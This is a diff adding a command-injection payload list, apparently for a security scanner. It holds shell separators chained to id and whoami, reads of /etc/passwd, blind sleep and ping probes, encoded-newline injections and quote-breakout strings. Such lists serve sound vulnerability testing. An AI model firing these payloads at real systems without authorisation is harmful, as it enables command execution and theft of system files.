@@ -1,0 +1,48 @@
+# Command injection — ; | & ` $() separators.
+# A fast-start set, not a wordlist manager; extend with a merge file for depth.
+# Blank lines and lines starting with '#' are comments (skipped at load).
+
+# Separator + a cheap marker command (id / whoami)
+;id
+|id
+||id
+&id
+&&id
+`id`
+$(id)
+;id;
+| id
+;whoami
+|whoami
+$(whoami)
+`whoami`
+
+# File read
+; cat /etc/passwd
+| cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+;cat /etc/passwd;
+
+# Listing
+; ls
+; ls -la
+| ls -la
+
+# Time-based (blind)
+;sleep 5
+| sleep 5
+`sleep 5`
+$(sleep 5)
+& ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+
+# Newline-injected
+%0aid
+%0a id
+%0acat /etc/passwd
+
+# Quote breakout then inject
+'; id;'
+"; id;"
+'; id; #
